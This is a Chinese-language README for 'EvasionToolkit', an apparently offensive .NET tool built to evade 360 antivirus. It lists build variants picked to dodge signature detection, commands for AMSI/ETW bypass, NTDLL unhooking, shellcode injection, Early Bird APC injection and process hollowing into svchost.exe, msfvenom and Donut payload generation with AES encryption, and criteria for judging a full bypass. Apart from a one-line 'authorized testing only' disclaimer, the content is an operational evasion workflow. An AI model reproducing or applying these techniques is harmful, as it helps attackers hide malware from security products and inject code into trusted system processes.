# EvasionToolkit 构建变体说明

## 版本对照

| 文件夹 | 编译方式 | 自包含 | 大小 | 需要 .NET 9 运行时？ | 适用场景 |
|--------|----------|--------|------|---------------------|----------|
| `fd/` | 标准 JIT | 否 | 163 KB | **是** | 目标已装 .NET 9，体积最小 |
| `fd_r2r/` | ReadyToRun | 否 | 178 KB | **是** | 目标已装 .NET 9，原生指令更低调 |
| `sc/` | 标准 JIT | 是 | 68 MB | 否 | 目标无 .NET，即拷即用 |
| `sc_r2r/` | ReadyToRun | 是 | 78 MB | 否 | 目标无 .NET，原生指令 + 不同二进制特征 |

> **ReadyToRun (R2R)**: 将 IL 中间码预编译为原生 x64 指令。生成的二进制结构与非 R2R 版本完全不同，可能绕过部分基于特征的静态检测。

---

## 虚拟机测试步骤（针对 360）

### 0. 安装 .NET 9 运行时（仅 fd/ 和 fd_r2r/ 需要）

```cmd
winget install Microsoft.DotNet.Runtime.9
```

### 1. 快速验证 — test 模式

执行 AMSI 绕过 + ETW 绕过 + 弹出计算器：

```cmd
EvasionToolkit.exe test
```

如果计算器弹出且 360 无反应 → 基础绕过机制未被行为检测拦截。

### 2. 逐步加压测试

```cmd
REM 仅 AMSI 绕过（常驻进程，每 60 秒 sleep）
EvasionToolkit.exe bypass_amsi

REM 仅 ETW 绕过
EvasionToolkit.exe bypass_etw

REM NTDLL Unhook（从磁盘加载干净 .text 段覆盖 EDR 钩子）
EvasionToolkit.exe unhook

REM Shellcode 注入（EnumWindows 回调执行，避开 CreateThread）
EvasionToolkit.exe shellcode payload.bin

REM AES 解密 + Shellcode 注入
EvasionToolkit.exe shellcode payload_enc.bin <32字节HEX_KEY> <16字节HEX_IV>

REM Early Bird APC 注入（注入到 svchost.exe）
EvasionToolkit.exe earlybird payload.bin C:\Windows\System32\svchost.exe

REM AES 解密 + Early Bird
EvasionToolkit.exe earlybird payload_enc.bin C:\Windows\System32\svchost.exe <KEY> <IV>

REM 进程镂空（Process Hollowing）
EvasionToolkit.exe hollow payload.bin C:\Windows\System32\svchost.exe

REM 完整链：AMSI + ETW + Unhook + Early Bird + AES 解密
EvasionToolkit.exe full payload_enc.bin C:\Windows\System32\svchost.exe <KEY> <IV>
```

### 3. 测试判定标准

| 360 反应 | 判定 | 说明 |
|-----------|------|------|
| 无任何弹窗/日志 | 完全绕过 | 该模式未被检测 |
| 弹窗但程序仍执行 | 部分拦截 | 检测到但阻止失败 |
| 程序被终止/隔离 | 被拦截 | 该行为触发了检测规则 |

---

## 生成 Payload

### 使用 generate_payload.py

```bash
# 生成 calc shellcode（C 格式输出，复制后编译）
python generate_payload.py

# 生成 XOR 加密的 calc shellcode
# 在脚本中设置 ENCRYPT=1 和 XOR_KEY
```

### 使用 msfvenom

```bash
# 生成 shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin

# 生成加密 shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f raw | \
  openssl enc -aes-256-cbc -K <64位HEX_KEY> -iv <32位HEX_IV> -out payload_enc.bin
```

### 使用 Donut（将 .NET 工具转 shellcode）

```bash
donut -f Tool.exe -a 2 -o tool.bin
```

---

## 常用 Payload 存放

将 shellcode 文件放在与 `EvasionToolkit.exe` 同一目录下：

```
builds/sc_r2r/
├── EvasionToolkit.exe
├── payload.bin          # 原始 shellcode
└── payload_enc.bin      # AES-256-CBC 加密 shellcode
```

---

## 注意事项

1. 仅用于**授权的安全测试**环境
2. 虚拟机应与宿主机隔离（禁用共享文件夹/剪贴板），防止恶意软件逃逸
3. 小文件（`fd/`, `fd_r2r/`）更不易触发静态检测，但需要目标安装 .NET 9 运行时
4. R2R 版本（`fd_r2r/`, `sc_r2r/`）的二进制特征与非 R2R 版本不同，可交叉测试
5. 加密 payload 需提供 64 位 HEX 格式的 AES-256 密钥 + 32 位 HEX 格式的 IV
